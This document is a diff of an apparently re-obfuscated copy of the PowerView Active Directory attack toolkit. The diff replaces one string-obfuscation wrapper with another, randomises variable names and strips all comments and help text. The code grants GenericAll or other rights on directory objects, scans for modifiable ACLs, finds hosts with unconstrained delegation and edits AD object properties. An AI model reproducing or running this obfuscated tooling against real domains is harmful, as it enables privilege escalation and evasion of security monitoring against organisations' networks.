+                            (ParseEntry20 @(233,191,118,215,201,56,88,209) @(187,250,56,131,172,111,109)) { (ParseEntry20 @(81,242,208,249,198,159,187,82,69,241,208,247,196,159,175,23,82,223,165,251,198,159,179,24,80,241,204,176,196,159,187,20,81,226,215,233,198,140,176,13,69,220,223,232,210,250,179,25) @(28,166,149,131,139,200,226,96)), (ParseEntry20 @(47,167,106,255,47,164,118,183,59,164,126,241,45,164,98,242,44,138,31,253,47,164,126,253,46,164,118,182,45,164,118,241,47,183,109,239,47,183,125,232,59,137,101,238,59,193,126,252) @(98,243,47,133)), (ParseEntry20 @(91,250,83,148,91,234,105,145,90,196,102,140,90,250,110,200,78,253,15,200,77,196,102,129,88,234,84,205,89,233,122,140,89,249,101,144,77,140,117,148,78,249,122,202,90,250,125,146) @(20,190,63,248))}
                         }
                     }
-
-                    if($NbbUfhH) {
-                        foreach($GUID in $NbbUfhH) {
-                            $HjYO7t = New-Object Guid $GUID
-                            $GxCkDuL = [System.DirectoryServices.ActiveDirectoryRights] (HandleResult95 @(222,153,235,34,14,224,58,231,155,212,64,7,214,88,232,174,231,83,105,138) @(140,193,131,18,84,183,15))
-                            $ZxhUCQ += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aQGrugN1,$GxCkDuL,$qbPIH,$HjYO7t,$uuNJ15
+                    if($Pt0LtPu8) {
+                        foreach($GUID in $Pt0LtPu8) {
+                            $bG6T = New-Object Guid $GUID
+                            $Y8zsSK0Q = [System.DirectoryServices.ActiveDirectoryRights] (ParseEntry20 @(169,128,75,205,53,211,206,179,121,170,61,215,154,143,71,146,11,197,198,229) @(251,216,35,253,111,132))
+                            $BhqND4 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $UT78Rwq,$Y8zsSK0Q,$bIhId,$bG6T,$jAAu5h
                         }
                     }
                     else {
-                        # deault to GenericAll rights
-                        $GxCkDuL = [System.DirectoryServices.ActiveDirectoryRights] (HandleResult95 @(203,184,234,169,46,11,211,250,229,236,50,32,251,203,129,225) @(153,138,188,220,116,83))
-                        $ZxhUCQ += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aQGrugN1,$GxCkDuL,$qbPIH,$uuNJ15
+                        $Y8zsSK0Q = [System.DirectoryServices.ActiveDirectoryRights] (ParseEntry20 @(139,75,10,79,23,3,147,9,5,10,11,40,187,56,97,7) @(217,121,92,58,77,91))
+                        $BhqND4 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $UT78Rwq,$Y8zsSK0Q,$bIhId,$jAAu5h
                     }
-
-                    Write-Verbose ((HandleResult95 @(175,103,133,162,76,201,175,36,173,167,77,192,158,28,133,186,76,202,179,36,172,141,104,212,180,21,242,247) @(253,84,207,202,46,167)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $Rights + (HandleResult95 @(186,183,217,37,200,98,194,205) @(240,206,155,83,170,11,131)) + $($_.Properties.distinguishedname))
-
+                    Write-Verbose ((ParseEntry20 @(77,150,105,143,75,99,77,213,65,138,74,106,124,237,105,151,75,96,81,213,64,160,111,126,86,228,30,218) @(31,165,35,231,41,13)) + $PrincipalSID + ([char]0x20+[char]0x27) + $Rights + (ParseEntry20 @(189,216,255,131,65,28,152,202) @(247,161,189,245,35,117,217)) + $($_.Properties.distinguishedname))
                     try {
-                        # add all the new ACEs to the specified object
-                        ForEach ($CDdB1kj in $ZxhUCQ) {
-                            Write-Verbose ((HandleResult95 @(61,66,247,199,205,188,158,31,19,208,204,200,177,132,37,1,223,194,225,162,175,40,55,206,230,238,239,241) @(111,113,189,175,175,210,204)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $($CDdB1kj.ObjectType) + (HandleResult95 @(239,166,60,112,48,242,187,17,109,25,232,184,28,59,101,194) @(165,223,126,9,81)) + $($_.Properties.distinguishedname))
+                        ForEach ($sIS1WFo in $BhqND4) {
+                            Write-Verbose ((ParseEntry20 @(240,115,173,217,192,46,181,193,192,45,132,214,193,8,173,193,192,45,169,193,193,7,161,194,235,1,218,140) @(162,64,231,177)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $($sIS1WFo.ObjectType) + (ParseEntry20 @(16,232,89,186,107,13,245,116,167,66,23,246,121,241,62,61) @(90,145,27,195,10)) + $($_.Properties.distinguishedname))
                             $Object = [adsi]($_.path)
-                            $Object.PsBase.ObjectSecurity.AddAccessRule($CDdB1kj)
+                            $Object.PsBase.ObjectSecurity.AddAccessRule($sIS1WFo)
                             $Object.PsBase.commitchanges()
                         }
                     }
                     catch {
-                        Write-Warning ((HandleResult95 @(189,164,88,221,200,144,166,155,72,151,224,203,141,146,64,212,200,206,140,155,113,236,224,211,141,145,92,212,201,228,169,143,91,229,151,158) @(239,252,18,164,170,163)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $Rights + (HandleResult95 @(187,61,118,89,88,34,101,204) @(241,68,52,47,58,75,36)) + $wLA0nXri + (HandleResult95 @(72,97,13,111) @(1,37,98,8,135,3,34,226)) + $_)
+                        Write-Warning ((ParseEntry20 @(159,210,182,225,220,114,132,237,166,171,244,41,175,228,174,232,220,44,174,237,159,208,244,49,175,231,178,232,221,6,139,249,181,217,131,124) @(205,138,252,152,190,65)) + $PrincipalSID + ([char]0x20+[char]0x27) + $Rights + (ParseEntry20 @(109,236,70,179,202,175,102,168) @(39,149,4,197,168,198)) + $sVpPS0bg + (ParseEntry20 @(212,5,125,87) @(157,65,18,48,222,240)) + $_)
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(198,173,19,144,53,137,42,52,221,180,100,212) @(148,245,89,233,87,186,99,2)) + $_)
+                Write-Warning ((ParseEntry20 @(40,214,173,36,90,73,199,209,20,121,71,179) @(122,142,231,93,56)) + $_)
             }
         }
     }
 }
-
-
 function Invoke-ACLScanner {
-<#
-    .SYNOPSIS
-        Searches for ACLs for specifable AD objects (default to all domain objects)
-        with a domain sid of > -1000, and have modifiable rights.
-
-        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.
-
-    .PARAMETER SamAccountName
-
-        Object name to filter for.        
-
-    .PARAMETER Name
-
-        Object name to filter for.
-
-    .PARAMETER DistinguishedName
-
-        Object distinguished name to filter for.
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-     
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER ADSprefix
-
-        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
-
-    .PARAMETER Domain
-
-        The domain to use for the query, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ResolveGUIDs
-
-        Switch. Resolve GUIDs to their display names.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv
-
-        Enumerate all modifable ACLs in the current domain, resolving GUIDs to display 
-        names, and export everything to a .csv
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $SamAccountName,
-
         [String]
         $Name = "*",
-
         [Alias('DN')]
         [String]
         $DistinguishedName = "*",
-
         [String]
         $Filter,
-
         [String]
         $ADSpath,
-
         [String]
         $ADSprefix,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $ResolveGUIDs,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
-    # Get all domain ACLs with the appropriate parameters
     Get-ObjectACL @PSBoundParameters | ForEach-Object {
-        # add in the translated SID for the object identity
         $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
         $_
     } | Where-Object {
-        # check for any ACLs with SIDs > -1000
         try {
             [int]($_.IdentitySid.split("-")[-1]) -ge 1000
         }
         catch {}
     } | Where-Object {
-        # filter for modifiable rights
-        ($_.ActiveDirectoryRights -eq (HandleResult95 @(222,29,106,29,172,224,195,252,118,12,46,133,218,200,177,18) @(140,47,60,104,246,184,137))) -or ($_.ActiveDirectoryRights -match (HandleResult95 @(55,45,229,35,105,38,75,146) @(97,30,175,83,13))) -or ($_.ActiveDirectoryRights -match (HandleResult95 @(103,20,72,205,188,47,100,75) @(54,39,2,161,229,119))) -or ($_.ActiveDirectoryRights -match (HandleResult95 @(197,25,112,98,214,237,197,50) @(151,94,38,17,140,181))) -or (($_.ActiveDirectoryRights -match (HandleResult95 @(38,112,191,38,46,127,226,125,46,127,133,69,21,127,179,121,16,105,234,43) @(116,40,215,22))) -and ($_.AccessControlType -eq (HandleResult95 @(101,249,240,8,72,7,205,181) @(52,174,136,123,42))))
+        ($_.ActiveDirectoryRights -eq (ParseEntry20 @(157,244,179,206,222,151,140,149,226,180,137,181,135,250,185,242) @(207,198,229,187,132))) -or ($_.ActiveDirectoryRights -match (ParseEntry20 @(143,235,151,35,189,159,136,110) @(217,216,221,83))) -or ($_.ActiveDirectoryRights -match (ParseEntry20 @(11,133,148,178,23,210,98,54) @(90,182,222,222,78,138,48))) -or ($_.ActiveDirectoryRights -match (ParseEntry20 @(196,81,88,168,204,78,92,183) @(150,22,14,219))) -or (($_.ActiveDirectoryRights -match (ParseEntry20 @(181,235,10,182,189,228,87,237,189,228,48,213,134,228,6,233,131,242,95,187) @(231,179,98,134))) -and ($_.AccessControlType -eq (ParseEntry20 @(119,67,42,138,161,21,119,111) @(38,20,82,249,195))))
     }
 }
-
-
 function Get-GUIDMap {
-<#
-    .SYNOPSIS
-
-        Helper to build a hash table of [GUID] -> resolved names
-
-        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
-
-    .PARAMETER Domain
-    
-        The domain to use for the query, defaults to the current domain.
-
-    .PARAMETER DomainController
-    
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .LINK
-
-        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
-#>
-
     [CmdletBinding()]
     Param (
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
-    $NbbUfhH = @{'00000000-0000-0000-0000-000000000000' = 'All'}
-
-    $pz38h3z = (Get-NetForest).schema.name
-
-    $LhzCAd = Get-DomainSearcher -ADSpath $pz38h3z -DomainController $DomainController -PageSize $PageSize
-    if($LhzCAd) {
-        $LhzCAd.filter = (HandleResult95 @(8,40,175,24,51,183,90,192,26,53,141,55,0,193,90,254,17,36,209,3,25,161,49,137) @(67,96,225,114,82,240,12,180))
+    $Pt0LtPu8 = @{'00000000-0000-0000-0000-000000000000' = 'All'}
+    $qJ4Rro = (Get-NetForest).schema.name
+    $SD3s = Get-DomainSearcher -ADSpath $qJ4Rro -DomainController $DomainController -PageSize $PageSize
+    if($SD3s) {
+        $SD3s.filter = (ParseEntry20 @(163,68,154,31,161,53,185,151,177,89,184,48,146,67,185,169,186,72,228,4,139,35,210,222) @(232,12,212,117,192,114,239,227))
         try {
-            $LhzCAd.FindAll() | Where-Object {$_} | ForEach-Object {
-                # convert the GUID
-                $NbbUfhH[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
+            $SD3s.FindAll() | Where-Object {$_} | ForEach-Object {
+                $Pt0LtPu8[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
             }
         }
         catch {
-            Write-Debug ((HandleResult95 @(104,163,84,208,12,247,115,156,127,254,90,163,99,149,72,217,12,131,104,139,124,196,13,163,104,202,72,227,60,135,120,143,71,241,47,242,115,186,35,148) @(58,251,30,169,110,196)) + $_)
+            Write-Debug ((ParseEntry20 @(23,142,122,58,245,128,228,219,36,129,4,36,206,221,251,204,39,145,98,51,245,222,206,219,23,231,102,9,197,240,239,200,28,142,113,117,222,242,144,129) @(69,214,48,67,151,179,173,188)) + $_)
         }      
     }
-
-    $nQTC3CX = Get-DomainSearcher -ADSpath $pz38h3z.replace((HandleResult95 @(107,122,51,146,250,13,15,76) @(62,72,125,253,160,90,62,36)),(HandleResult95 @(120,159,110,185,112,144,51,226,112,144,87,253,127,170,106,231,75,143,84,243) @(42,199,6,137))) -DomainController $DomainController -PageSize $PageSize
-    if ($nQTC3CX) {
-        $nQTC3CX.filter = (HandleResult95 @(99,246,132,186,34,114,120,66,213,248,157,48,70,118,102,203,237,132,13,105,76,70,227,196,177,113,103,108,113,131,243,191,32,44,96,123,208,234,183,44,123,109,67,140) @(40,177,189,211,67,31,46))
+    $k1nkLA1 = Get-DomainSearcher -ADSpath $qJ4Rro.replace((ParseEntry20 @(50,121,99,210,160,102,86,35) @(103,75,45,189,250,49)),(ParseEntry20 @(151,29,209,164,247,189,31,30,159,18,232,224,248,135,70,27,164,13,235,238) @(197,69,185,148,173,234,42,117))) -DomainController $DomainController -PageSize $PageSize
+    if ($k1nkLA1) {
+        $k1nkLA1.filter = (ParseEntry20 @(222,118,199,4,90,41,142,9,241,116,176,30,98,28,150,25,197,102,176,27,89,42,138,26,247,3,134,47,98,118,150,15,246,2,176,62,90,19,188,12,241,114,149,80) @(149,49,254,109,59,68,216,99))
         try {
-            $nQTC3CX.FindAll() | Where-Object {$_} | ForEach-Object {
-                # convert the GUID
-                $NbbUfhH[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
+            $k1nkLA1.FindAll() | Where-Object {$_} | ForEach-Object {
+                $Pt0LtPu8[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
             }
         }
         catch {
-            Write-Debug ((HandleResult95 @(156,205,134,13,208,149,21,169,244,155,64,213,255,50,152,229,174,51,224,214,62,163,246,171,38,131,240,22,156,214,142,0,235,254,29,248,220,141,73,143) @(206,149,204,116,178,166,92)) + $_)
+            Write-Debug ((ParseEntry20 @(33,3,201,125,44,221,165,20,58,212,48,41,183,130,37,43,225,67,28,158,142,30,56,228,86,127,184,166,33,24,193,112,23,182,173,69,18,194,57,115) @(115,91,131,4,78,238,236)) + $_)
         }
     }
-
-    $NbbUfhH
+    $Pt0LtPu8
 }
-
-
 function Get-NetComputer {
-<#
-    .SYNOPSIS
-
-        This function utilizes adsisearcher to query the current AD context
-        for current computer objects. Based off of Carlos Perez's Audit.psm1
-        script in Posh-SecMod (link below).
-
-    .PARAMETER ComputerName
-
-        Return computers with a specific name, wildcards accepted.
-
-    .PARAMETER SPN
-
-        Return computers with a specific service principal name, wildcards accepted.
-
-    .PARAMETER OperatingSystem
-
-        Return computers with a specific operating system, wildcards accepted.
-
-    .PARAMETER ServicePack
-
-        Return computers with a specific service pack, wildcards accepted.
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-
-    .PARAMETER Printers
-
-        Switch. Return only printers.
-
-    .PARAMETER Ping
-
-        Switch. Ping each host to ensure it's up before enumerating.
-
-    .PARAMETER FullData
-
-        Switch. Return full computer objects instead of just system names (the default).
-
-    .PARAMETER Domain
-
-        The domain to query for computers, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Unconstrained
-
-        Switch. Return computer objects that have unconstrained delegation.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetComputer
-        
-        Returns the current computers in current domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetComputer -SPN mssql*
-        
-        Returns all MS SQL servers on the domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetComputer -Domain testing
-        
-        Returns the current computers in 'testing' domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetComputer -Domain testing -FullData
-        
-        Returns full computer objects in the 'testing' domain.
-
-    .LINK
-
-        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [Alias('HostName')]
         [String]
         $ComputerName = '*',
-
         [String]
         $SPN,
-
         [String]
         $OperatingSystem,
-
         [String]
         $ServicePack,
-
         [String]
         $Filter,
-
         [Switch]
         $Printers,
-
         [Switch]
         $Ping,
-
         [Switch]
         $FullData,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [Switch]
         $Unconstrained,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        # so this isn't repeated if users are passed on the pipeline
-        $JlVwn73I = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        $zU2pM = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
     }
-
     process {
-
-        if ($JlVwn73I) {
-
-            # if we're checking for unconstrained delegation
+        if ($zU2pM) {
             if($Unconstrained) {
-                Write-Verbose (HandleResult95 @(72,182,82,22,223,112,202,107,31,235,40,234,77,57,230,107,231,109,60,214,127,182,53,9,216,69,214,104,29,210,80,227,96,76,208,45,229,71,60,209,127,183,77,25,216,74,177,110,28,142,40,254,96,54,246,117,229,83,75,208,71,199,70,21,230,74,252,104,36,142,91,180,101,41,133,104) @(29,132,4,126,188))
-                $Filter += (HandleResult95 @(64,117,197,75,221,151,203,144,82,15,221,71,227,152,180,226,90,15,170,68,227,135,203,164,105,121,252,73,203,165,200,167,68,121,194,70,203,165,196,170,70,71,198,0,201,166,181,170,71,87,194,68,200,139,192,168,68,87,163,0,202,165,208,171,68,121,244,65) @(11,61,147,49,135,207,129,210))
+                Write-Verbose (ParseEntry20 @(237,195,29,229,193,213,191,36,236,245,141,159,2,202,248,206,146,34,207,200,218,195,122,250,198,224,163,39,238,204,245,150,47,191,206,136,144,8,207,207,218,194,2,234,198,239,196,33,239,144,141,139,47,197,232,208,144,28,184,206,226,178,9,230,248,239,137,39,215,144,254,193,42,218,155,205) @(184,241,75,141,162))
+                $Filter += (ParseEntry20 @(103,210,62,4,163,234,102,216,49,76,183,196,72,205,93,78,168,128,21,239,12,54,179,196,78,222,7,6,181,216,101,239,39,58,168,197,96,240,45,6,180,200,121,171,38,23,205,202,96,240,57,11,182,246,109,224,39,20,201,131,97,240,57,7,182,246,75,234) @(44,154,104,126,249,178))
             }
-            # set the filters for the seracher if it exists
             if($Printers) {
-                Write-Verbose (HandleResult95 @(67,104,173,47,179,123,20,148,38,135,35,52,178,0,138,96,57,146,5,167,117,55,151,50,180,81,12,130,36,167,43,103) @(22,90,251,71,208))
-                # $CompSearcher.filter="(&(objectCategory=printQueue)$Filter)"
-                $Filter += (HandleResult95 @(213,15,146,229,134,243,30,193,232,162,208,32,207,203,177,240,42,152,198,210,206,16,233,245,134,201,125,155,217,191,200,36,207,219,178,238) @(158,72,171,140,231))
+                Write-Verbose (ParseEntry20 @(61,62,89,228,222,5,66,96,237,234,93,98,70,203,231,30,111,102,206,202,11,97,99,249,217,47,90,118,239,202,85,49) @(104,12,15,140,189))
+                $Filter += (ParseEntry20 @(43,93,22,25,194,244,129,176,4,95,97,24,199,222,129,180,2,41,101,69,243,193,149,163,1,77,26,64,246,193,129,182,4,77,122,0) @(96,26,47,112,163,153,215,218))
             }
             if($SPN) {
-                Write-Verbose ((HandleResult95 @(179,186,239,215,195,139,198,214,222,247,211,230,240,248,250,144,235,208,253,202,132,186,136,200,196,190,218,213,220,206,171,239,221,141,204,214,233,250,253,244,179,205,141,137,233,167,181,132) @(230,136,185,191,160)) + $SPN)
-                $Filter += ((HandleResult95 @(94,20,162,115,90,44,176,101,5,222,73,104,33,135,121,41,181,45,85,53,179,66,36,163,70,110,115,134,69,13,209,34) @(21,92,236,31,57,66,234)) + $SPN + ")")
+                Write-Verbose ((ParseEntry20 @(124,108,156,38,76,62,148,235,72,9,255,32,102,20,128,242,74,55,136,36,77,97,235,243,77,6,152,34,76,61,151,227,77,108,166,126,78,16,152,208,124,27,254,120,102,18,231,185) @(41,94,202,78,47,83,218,132)) + $SPN)
+                $Filter += ((ParseEntry20 @(212,47,34,22,252,9,54,10,198,85,58,43,252,10,0,15,198,85,0,13,198,48,20,53,198,48,93,22,207,54,81,71) @(159,103,108,122)) + $SPN + ")")
             }
             if($OperatingSystem) {
-                $Filter += ((HandleResult95 @(206,115,103,41,237,75,207,92,58,25,219,102,223,7,16,107,212,32,215,88,60,10,135,46) @(133,52,94,94,183,19)) + $OperatingSystem + ")")
+                $Filter += ((ParseEntry20 @(120,167,103,206,10,107,170,54,221,23,95,149,4,138,30,6,131,109,235,60,81,180,110,132) @(51,224,94,185,80)) + $OperatingSystem + ")")
             }
             if($ServicePack) {
-                $Filter += ((HandleResult95 @(233,198,96,138,155,222,255,155,198,198,53,136,155,181,251,198,193,178,11,145,163,222,251,159,193,239,3,141,152,180,227,132,251,214,23,143,145,215,136,206) @(162,129,89,253,193,134,181,243)) + $ServicePack + ")")
+                $Filter += ((ParseEntry20 @(248,129,72,133,233,158,59,154,215,129,29,135,233,245,63,199,208,245,35,158,209,158,63,158,208,168,43,130,234,244,39,133,234,145,63,128,227,151,76,207) @(179,198,113,242)) + $ServicePack + ")")
             }
-
-            $JlVwn73I.filter = ((HandleResult95 @(74,6,97,242,178,113,149,79,20,111,211,187,35,224,87,48,92,219,131,116,176,70,16,1,210,149,0,226,76,63,121,175,156,59,138,52,14,107,245,186,35,189,79,42,90,174,159,113,177,108,3,76,199,133,113,238) @(1,69,56,157,209,65,211)) + $ComputerName + ")" + $Filter + ")")
-
+            $zU2pM.filter = ((ParseEntry20 @(101,24,230,195,104,30,29,241,253,92,96,49,221,159,93,91,63,249,254,62,77,28,234,149,68,106,26,142,225,113,111,105,242,214,82,27,16,236,196,96,76,53,241,195,105,29,21,143,206,102,104,47,229,248,59,19) @(46,91,191,172,11)) + $ComputerName + ")" + $Filter + ")")
             try {
-
-                $JlVwn73I.FindAll() | Where-Object {$_} | ForEach-Object {
-                    $yssh = $True
+                $zU2pM.FindAll() | Where-Object {$_} | ForEach-Object {
+                    $lPdgSYQ = $True
                     if($Ping) {
-                        # TODO: how can these results be piped to ping for a speedup?
-                        $yssh = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
+                        $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                     }
-                    if($yssh) {
-                        # return full data objects
+                    if($lPdgSYQ) {
                         if ($FullData) {
-                            # convert/process the LDAP fields for each result
                             Convert-LDAPProperty -Properties $_.Properties
                         }
                         else {
-                            # otherwise we're just returning the DNS host name
                             $_.properties.dnshostname
                         }
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(146,63,118,170,201,243,46,10,154,234,253,90) @(192,103,60,211,171)) + $_)
+                Write-Warning ((ParseEntry20 @(60,77,69,94,14,159,39,35,70,102,81,145) @(110,21,15,39,108,172)) + $_)
             }
         }
     }
 }
-
-
 function Get-ADObject {
-<#
-    .SYNOPSIS
-
-        Takes a domain SID and returns the user, group, or computer object
-        associated with it.
-
-    .PARAMETER SID
-
-        The SID of the domain object you're querying for.
-
-    .PARAMETER Name
-
-        The Name of the domain object you're querying for.
-
-    .PARAMETER SamAccountName
-
-        The SamAccountName of the domain object you're querying for. 
-
-    .PARAMETER Domain
-
-        The domain to query for objects, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Filter
-
-        Additional LDAP filter string for the query.
-
-    .PARAMETER ReturnRaw
-
-        Switch. Return the raw object instead of translating its properties.
-        Used by Set-ADObject to modify object properties.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"
-        
-        Get the domain object associated with the specified SID.
-        
-    .EXAMPLE
-
-        PS C:\> Get-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"
-        
-        Get the AdminSDHolder object for the testlab.local domain.
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $SID,
-
         [String]
         $Name,
-
         [String]
         $SamAccountName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [String]
         $Filter,
-
         [Switch]
         $ReturnRaw,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
     process {
         if($SID) {
-            # if a SID is passed, try to resolve it to a reachable domain name for the searcher
             try {
                 $Name = Convert-SidToName $SID
                 if($Name) {
-                    $HXIxcvgg = Convert-NT4toCanonical -ObjectName $Name
-                    if($HXIxcvgg) {
-                        $Domain = $HXIxcvgg.split("/")[0]
+                    $JoeNd = Convert-NT4toCanonical -ObjectName $Name
+                    if($JoeNd) {
+                        $Domain = $JoeNd.split("/")[0]
                     }
                     else {
-                        Write-Warning ((HandleResult95 @(24,174,162,151,252,128,218,45,149,133,184,228,209,161,50,196,137,185,171,221,218,12,184,162,188,221,242,253) @(74,246,232,238,158,179,147)) + $SID + "'")
+                        Write-Warning ((ParseEntry20 @(227,160,8,112,120,130,177,37,106,119,231,130,32,59,98,131,153,21,60,116,248,190,12,67,72,242,185,44) @(177,248,66,9,26)) + $SID + "'")
                         return $Null
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(251,5,215,216,89,98,224,58,254,204,109,43,203,111,229,147,90,6,156,51,212,231,117,27,251,30,220,207) @(169,93,157,161,59,81)) + $SID + (HandleResult95 @(104,254,12,253,179,99,186,112) @(34,135,77,203,250)) + $_)
+                Write-Warning ((ParseEntry20 @(193,28,169,243,248,23,58,95,240,41,181,240,248,22,11,10,242,19,214,228,211,98,61,114,193,7,162,228) @(147,68,227,138,154,36,115,56)) + $SID + (ParseEntry20 @(139,140,208,206,174,222,79,252) @(193,245,145,248,231,159,114)) + $_)
                 return $Null
             }
         }
-
-        $svDmY2Ge = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
-
-        if($svDmY2Ge) {
-
+        $piKX = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        if($piKX) {
             if($SID) {
-                $svDmY2Ge.filter = ((HandleResult95 @(225,37,56,220,34,170,48,52,240,49,47,131,35,170,22,46,250,55,92,142) @(170,102,97,179,64,152,122,69)) + $SID + ")" + $Filter + ")")
+                $piKX.filter = ((ParseEntry20 @(70,22,35,164,110,63,31,11,145,91,67,101,25,249,96,102,5,43,246,49) @(13,85,122,203,12)) + $SID + ")" + $Filter + ")")
             }
             elseif($Name) {
-                $svDmY2Ge.filter = ((HandleResult95 @(11,136,95,50,89,25,6,191,92,9,11,73) @(64,203,6,93,59,116)) + $Name + ")" + $Filter + ")")
+                $piKX.filter = ((ParseEntry20 @(9,19,148,55,122,80,44,169,24,4,253,101) @(66,80,205,88,24,61,106,221)) + $Name + ")" + $Filter + ")")
             }
             elseif($SamAccountName) {
-                $svDmY2Ge.filter = ((HandleResult95 @(53,57,202,237,251,150,111,174,47,45,221,232,250,151,127,175,26,63,166,234,250,243,124,227) @(126,122,147,130,152,164,41,218)) + $SamAccountName + ")" + $Filter + ")")
+                $piKX.filter = ((ParseEntry20 @(21,59,241,253,85,88,24,12,249,197,120,0,60,75,254,231,82,47,107,16,202,197,99,83) @(94,120,168,146,54,106)) + $SamAccountName + ")" + $Filter + ")")
             }
-
-            $svDmY2Ge.FindAll() | Where-Object {$_} | ForEach-Object {
+            $piKX.FindAll() | Where-Object {$_} | ForEach-Object {
                 if($ReturnRaw) {
                     $_
                 }
                 else {
-                    # convert/process the LDAP fields for each result
                     Convert-LDAPProperty -Properties $_.Properties
                 }
             }
         }
     }
 }
-
-
 function Set-ADObject {
-<#
-    .SYNOPSIS
-
-        Takes a SID, name, or SamAccountName to query for a specified
-        domain object, and then sets a specified 'PropertyName' to a
-        specified 'PropertyValue'.
-
-    .PARAMETER SID
-
-        The SID of the domain object you're querying for.
-
-    .PARAMETER Name
-
-        The Name of the domain object you're querying for.
-
-    .PARAMETER SamAccountName
-
-        The SamAccountName of the domain object you're querying for. 
-
-    .PARAMETER Domain
-
-        The domain to query for objects, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER Filter
-
-        Additional LDAP filter string for the query.
-
-    .PARAMETER PropertyName
-
-        The property name to set.
-
-    .PARAMETER PropertyValue
-
-        The value to set for PropertyName
-
-    .PARAMETER PropertyXorValue
-
-        Integer value to binary xor (-bxor) with the current int value.
-
-    .PARAMETER ClearValue
-
-        Switch. Clear the value of PropertyName
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0
-        
-        Set the countrycode for matt.admin to 0
-
-    .EXAMPLE
-
-        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536
-        
-        Set the password not to expire on matt.admin
